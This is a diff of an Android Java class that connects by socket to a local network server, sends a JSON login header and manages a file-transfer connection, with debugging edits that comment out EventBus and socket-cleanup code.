@@ -48,6 +48,7 @@ public class DownloadFileRun implements Runnable {
     private final int SDK_INT = Build.VERSION.SDK_INT;
     private Intent intent;
 
+
     public DownloadFileRun(File[] allFoldersFiles, Context context, Intent intent) {
         this.allFoldersFiles = allFoldersFiles;
         this.context = context;
@@ -55,9 +56,9 @@ public class DownloadFileRun implements Runnable {
     }
 
     private void start() {
-        EventBus.getDefault().register(this);
+       // EventBus.getDefault().register(this);
         AdapterDownloadFlag is_downloadFlag = new AdapterDownloadFlag();
-        String server = "192.168.1.109";
+        String server = "192.168.168.101";
         int port = 2221;
 
         String isLoaded = "isLoaded ";
@@ -66,7 +67,7 @@ public class DownloadFileRun implements Runnable {
             socket.connect(new InetSocketAddress(server, port),2000);
             socket.setSoTimeout(50000);
             dos = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
-            send2();
+            oaut();
             Log.d(Msg, "Postal SOCKET work");
             try {
                 BufferedReader reader = new BufferedReader(
@@ -77,7 +78,10 @@ public class DownloadFileRun implements Runnable {
                 is_downloadFlag.setTreadIsWork(false);
                 boolean is_KeepConnectionFlag = true;
 
+
                 while ((line = reader.readLine()) != null) {
+
+
                     Log.d(Msg, "ANSWER " + line);
                     if (line.startsWith(isLoaded)) {// сделать в оддельном потоке, что бы прием- передача
                         //были в разных потоках
@@ -90,13 +94,13 @@ public class DownloadFileRun implements Runnable {
 
                     if (line.equals("isConnect") && !is_downloadFlag.getTreadIsWork()
                             && is_KeepConnectionFlag) {
-
+                        is_KeepConnectionFlag = false;
                         //если поток передачи даннных запущен не поддерживать свъязь с сервером
                         KeepConnection keep_con = new KeepConnection(dos, is_downloadFlag,
                                 is_KeepConnectionFlag);
                         keep_con.setName("KeepConnection");
                         keep_con.start();
-                        //  is_KeepConnectionFlag = false;
+
                         Log.e(Msg, "Название потока поддержки свъязи с сервером "+ keep_con.getName().toString());
                     }
 
@@ -124,14 +128,18 @@ public class DownloadFileRun implements Runnable {
                             dos.flush();
                         }
                     }
-                }
+                }Log.d(Msg, "       ВЫХОД ИЗ ЦЫКЛА ");
+                //socket.close();dos.close();
+
             } catch (IOException ex) { Log.e(Msg, "Eror "+ex);
-                EventBus.getDefault().unregister(this);
-                dos.close();socket.close();
-                notGiveUp();
+                //EventBus.getDefault().unregister(this);
+//                if(!socket.isOutputShutdown()){Log.d(Msg, " isOutputShutdown !");}
+//                if(!socket.getKeepAlive()){Log.d(Msg, " getKeepAlive !");}
+//                reader.close(); socket.close();dos.close();
+//                 notGiveUp();
             }
         } catch (IOException e) {
-            e.printStackTrace();
+            Log.e(Msg, "Eror2 "+e);
         }
         //outputStream = socket.getOutputStream();
 
@@ -145,16 +153,16 @@ public class DownloadFileRun implements Runnable {
         context.sendBroadcast(intent, requiredPermission);
     }
 
-    @Subscribe(threadMode = ThreadMode.BACKGROUND)
-    public void onComand(EventBusData event){
-        start_download_on_event = true;
-    }
+//    @Subscribe(threadMode = ThreadMode.BACKGROUND)
+//    public void onComand(EventBusData event){
+//        start_download_on_event = true;
+//    }
 
     /** Send a line of text
      * file_Name имя файла, folder_Name имя папки, patch путь к файлу*/
 
 
-    public void send2() {
+    public void oaut() {
         try {
             JSONObject aouth = new JSONObject();//Заголовок
             JSONObject log_pass = new JSONObject();
